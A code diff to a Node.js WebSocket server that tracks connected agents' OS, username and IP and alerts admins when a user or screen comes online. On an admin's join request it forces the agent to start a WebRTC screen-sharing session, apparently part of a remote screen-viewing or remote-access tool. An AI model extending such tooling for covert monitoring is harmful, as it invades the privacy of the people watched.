@@ -95,7 +95,6 @@ app.get('/health', (req, res) => {
 wss.on('connection', (ws, req) => {
  let id = uuidv4().substr(0, 8);
  ws.id = id;
- // FIX: Set isAdmin directly on the WebSocket instance
  ws.isAdmin = false;
  clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };
 
@@ -117,18 +116,19 @@ wss.on('connection', (ws, req) => {
 
  // 1. Admin Registration
  if (data.type === 'register_admin') {
- // FIX: Set on both the wrapper and the instance
  clients[id].isAdmin = true;
  ws.isAdmin = true; 
  logToFile(`[ADMIN] Connected with ID: ${id}`);
+ 
+ // Send ALL currently known users to this new admin immediately
  Object.keys(knownUsers).forEach(uid => {
- ws.send(JSON.stringify({ 
- type: 'info', 
- id: uid, 
- os: knownUsers[uid].info.os, 
- user: knownUsers[uid].info.user, 
- ip: knownUsers[uid].info.ip 
- }));
+     ws.send(JSON.stringify({ 
+         type: 'info', 
+         id: uid, 
+         os: knownUsers[uid].info.os || 'Unknown', 
+         user: knownUsers[uid].info.user || 'Unknown', 
+         ip: knownUsers[uid].info.ip || 'Unknown' 
+     }));
  });
  return;
  }
@@ -138,9 +138,9 @@ wss.on('connection', (ws, req) => {
  clients[id].info = data;
  clients[id].lastSeen = Date.now();
  knownUsers[id] = { 
- info: data, 
- lastSeen: Date.now(), 
- status: 'Online' 
+     info: data, 
+     lastSeen: Date.now(), 
+     status: 'Online' 
  };
  notifyAdmin(id, `🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`);
  broadcastToAdmin(id, data);
@@ -161,10 +161,10 @@ wss.on('connection', (ws, req) => {
  wss.clients.forEach(client => {
  if (client.readyState === WebSocket.OPEN && client.isAdmin) {
  client.send(JSON.stringify({ 
- type: data.type, 
- targetId: id, 
- sdp: data.sdp,
- candidate: data.candidate
+     type: data.type, 
+     targetId: id, 
+     sdp: data.sdp,
+     candidate: data.candidate
  }));
  }
  });
@@ -183,10 +183,10 @@ wss.on('connection', (ws, req) => {
  wss.clients.forEach(client => {
  if (client.readyState === WebSocket.OPEN && client.isAdmin) {
  client.send(JSON.stringify({ 
- type: data.type, 
- targetId: id, 
- sdp: data.sdp,
- candidate: data.candidate
+     type: data.type, 
+     targetId: id, 
+     sdp: data.sdp,
+     candidate: data.candidate
  }));
  }
  });
@@ -211,11 +211,10 @@ wss.on('connection', (ws, req) => {
  }
  });
  } 
- // 6. Admin Request Join (FIXED)
+ // 6. Admin Request Join
  else if (data.type === 'request_join') {
  const targetId = data.targetId;
  if (clients[targetId]) {
- // Send a specific 'start_join' signal to force the agent to initiate the offer
  clients[targetId].ws.send(JSON.stringify({
  type: 'start_join',
  from: id, 
@@ -223,15 +222,17 @@ wss.on('connection', (ws, req) => {
  }));
  logToFile(`[ADMIN] Requested join to ${targetId}`);
  }
- }
- // Generic Fallback
+ } 
+ // Generic Fallback - DO NOT SPAM LINUX
  else {
- if (!clients[id].info && !clients[id].isAdmin) {
- knownUsers[id] = knownUsers[id] || {};
- knownUsers[id].info = knownUsers[id].info || { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
- notifyAdmin(id, `📺 Screen Active: ${id}`);
+ // Only broadcast if we know who it is, otherwise ignore to prevent spam
+ if (knownUsers[id]) {
+     // Update last seen on heartbeat-like messages
+     if (data.type === 'heartbeat') {
+         knownUsers[id].lastSeen = Date.now();
+         knownUsers[id].status = 'Online';
+     }
  }
- broadcastToAdmin(id, data);
  }
  } catch (e) {
  logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
